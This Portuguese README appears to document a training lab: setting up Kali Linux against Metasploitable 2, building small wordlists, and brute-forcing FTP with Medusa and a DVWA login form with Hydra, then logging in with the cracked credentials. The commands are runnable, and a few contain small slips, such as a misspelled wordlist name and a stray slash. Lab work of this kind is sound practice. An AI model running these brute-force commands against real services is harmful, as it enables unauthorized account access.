### Desafio-kali

**Download Kali Linux e Metasploitable 2**

[Kali Linux](https://www.kali.org/)  
[Metasploitable 2](https://sourceforge.net/projects/metasploitable2/files/metasploitable-linux-2.0.0.zip/download)


## Configurando o Metasploitable 2 com o Kali Linux

_Configurações > Expert > Rede > Ligado a > host-only_

<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap01.png" alt ="Screenshot 1" width="650">

## Verificando a conexão das imagens
```ping -c 3 192.168.56.102```   

<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap02.png" alt ="Screenshot 2" width="650">

## Criando Wordlists
### Colocando nomes e usuários comuns em diferentes arquivos
### Com o comando abaixo criamos um arquivo de nome **users.txt** e nele inserimos alguns nomes de usuários padrões: 
```echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt```
### Criamos também um arquivo de nome **pass.txt** e inserimos algumas senhas padrões, usando o seguinte código:
```echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt```

## Rodando o primeiro ataque usando o Medusa  
Utilizando o medusa uso o a linha de comando **-h** seguido do host alvo, em seguida **-U** e informo o nome do arquivo com a lista de usuário, após isso **-P** com o nome do arquivo com a lista de senhas, seguindo com **-M ftp** para informar qual serviço será atacado e por fim **-t 6** para usar 6 Threads simultâneas, deixando a linha de código da seguinte forma:  

```
medusa -h 192.168.56.102 -U usesr.txt -P pass.txt -M ftp -t 6
```

Após rodar o código analisamos e buscamos quais resultados obtiveram **Sucesso**  

<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap03.png" alt ="Screenshot 3" width="650">

## Estabelecendo a conexão com o alvo  
Tendo descoberto as credenciais de acesso ao FTP, vamos para a tentativa de conexão e acesso usando o comando:  
```ftp 192.168.56.102```  
É solicitado o login e senha, mas agora já sabemos que ambos são **msfadmin** e assim obtemos o **Login sucessful**  

 <img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap04.png" alt ="Screenshot 4" width="650">


 ## Automatizando tentativas de ataque a formulários web (DVWA) usando Hydra

Inicialmente criamos as Wordlists para usuários e senhas como já foi feito anteriormente:

```
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt

echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
```


Criados as Wordlists vamos para o ataque de Brute Force com o Hydra, e pra isso passamos os seguintes parâmentros para o hydra:

```
hydra -L users.txt -P pass.txt 192.168.56.102 http-form-post /
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 6 -f 
```
<img src="https://github.com/LipehSanttos/desafio-kali-dio/blob/main/images/snap05.png" alt ="Screenshot 5" width="650">

-  ```-L users.txt``` e ```-P pass.txt``` são as wordlists.  
-  ```http-form-post``` e a string ```"/path:postdata:fail-string"```.  
- ``` ^USER^``` e ```^PASS^``` serão substituídos.  
-  ```-V``` visualizar cada tentativa.

